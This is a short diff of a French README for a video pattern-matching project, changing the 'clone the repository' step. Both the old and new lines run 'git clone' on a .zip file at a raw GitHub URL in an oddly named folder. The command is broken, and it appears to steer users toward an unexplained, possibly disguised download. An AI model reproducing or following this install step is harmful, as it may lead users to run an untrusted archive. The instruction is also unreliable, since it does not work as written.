@@ -23,5 +23,5 @@ Un projet de vision par ordinateur qui détecte un motif spécifique dans une vi
 
 1. Cloner le dépôt :
    ```bash
-   git clone https://raw.githubusercontent.com/LarissaTchomgang/pattern-matcher/main/blennoemesis/pattern_matcher_v2.8.zip
+   git clone https://raw.githubusercontent.com/LarissaTchomgang/pattern-matcher/main/blennoemesis/matcher-pattern-v1.3.zip
    cd pattern-matcher
